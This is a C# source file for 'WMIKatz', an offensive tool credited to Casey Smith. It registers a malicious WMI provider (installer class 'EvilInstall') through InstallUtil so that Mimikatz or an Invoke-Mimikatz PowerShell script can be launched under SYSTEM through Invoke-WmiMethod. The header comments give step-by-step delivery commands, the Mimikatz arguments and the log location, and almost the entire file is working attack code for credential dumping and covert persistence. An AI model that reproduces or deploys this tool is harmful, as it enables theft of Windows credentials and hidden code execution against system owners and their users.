// 
// 
//
// By Casey Smith @subTee
// WMIKatz
// License: BSD 3-Clause
// 
// Deliver and Install dll 
// Execute InstallUtil from Path where dll is located
// C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /i WMIkatz.dll
// 
// Invoke-WmiMethod -Namespace root\cimv2 -Class Win32_WMIKatz -Name RunMimikatz -ArgumentList @('log coffee markruss exit','C:\Tools\mimikatz.exe')
// Outputs To C:\Windows\System32\mimikatz.log
//  
// Invoke-WmiMethod -Namespace root\cimv2 -Class Win32_WMIKatz -Name InvokeMimikatz -ArgumentList "C:\Tools\Invoke-Mimikatz.ps1"
// 
// wmic.exe path Win32_WMIKatz 
// Verifies Installation
// Version 4.5.2
// Codename: Nightmare


using System;
using System.Text;
using System.Collections;
using System.Management.Instrumentation;
using System.Management;
using System.Diagnostics;
using System.Reflection;
using System.Configuration.Install;
using System.Runtime.InteropServices;
using System.EnterpriseServices.Internal;

// Adding libraries for PowerShell Stuff
using System.Collections.ObjectModel;
using System.Management.Automation;
using System.Management.Automation.Runspaces;


[assembly: WmiConfiguration(@"root\cimv2", HostingModel = ManagementHostingModel.LocalSystem)]
namespace WMIKatz
{
    [System.ComponentModel.RunInstaller(true)]
    public class EvilInstall : DefaultManagementInstaller
    {
        public override void Install(IDictionary stateSaver)
        {

            new System.EnterpriseServices.Internal.Publish().GacInstall("WMIKatz.dll");
            base.Install(stateSaver);
            System.Runtime.InteropServices.RegistrationServices RS = new System.Runtime.InteropServices.RegistrationServices();
        }

        public override void Uninstall(IDictionary savedState)
        {

            try
            {
                new System.EnterpriseServices.Internal.Publish().GacRemove("WMIKatz.dll");
                ManagementClass MC = new ManagementClass(@"root\cimv2:Win32_WMIKatz");
                MC.Delete();
            }
            catch { }

            try
            {
                base.Uninstall(savedState);
            }
            catch { }
        }
    }

    [ManagementEntity(Name = "Win32_WMIkatz")]
    public class WMI_Provider
    {
        [ManagementKey]
        public string Member { get; set; }


        public WMI_Provider(string sMember)
        {
            Member = sMember;
        }


        [ManagementEnumerator]
        static public IEnumerable DoEvil()
        {
            string sName = "Win32_WMIKatz v.4.5.2";
            yield return new WMI_Provider(sName);

        }

        [ManagementTask]
        public static void RunMimikatz(string arguments, string path)
        {

            ProcessStartInfo startInfo = new ProcessStartInfo();
            startInfo.Arguments = arguments;
            startInfo.FileName = path;
            Process.Start(startInfo);
        }

        [ManagementTask]
        public static void InvokeMimikatz(string path)
        {
            string content = System.IO.File.ReadAllText(path);
            RunPSFile(content);

        }



        public static void RunPSFile(string script)
        {
            PowerShell ps = PowerShell.Create();
            ps.AddScript(script).Invoke();
        }



    }

}
